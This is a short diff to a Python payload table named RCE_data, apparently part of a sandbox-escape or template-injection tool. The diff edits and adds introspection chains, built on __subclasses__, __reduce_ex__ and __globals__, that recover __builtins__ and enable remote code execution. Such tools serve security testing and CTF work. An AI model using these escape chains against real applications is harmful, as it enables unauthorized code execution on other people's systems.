@@ -156,7 +156,8 @@ RCE_data = {
     ],
     "restore_builtins_in_other_ns": [
         ["TYPE.__subclasses__(TYPE)[0].register.__globals__['__builtins__']", "TYPE"],
-        ["OBJECT.__reduce_ex__(3)[0].__globals__['__builtins__']", "OBJECT"],
+        ["OBJECT.__reduce_ex__(RANDOMINT,3)[0].__globals__['__builtins__']", "OBJECT"],
+        ["OBJECT.__reduce_ex__(BUILTINOBJ,3)[0].__globals__['__builtins__']", "OBJECT"],
         [
             "{}.__class__.__subclasses__()[2].copy.__globals__['__builtins__']",
             "",
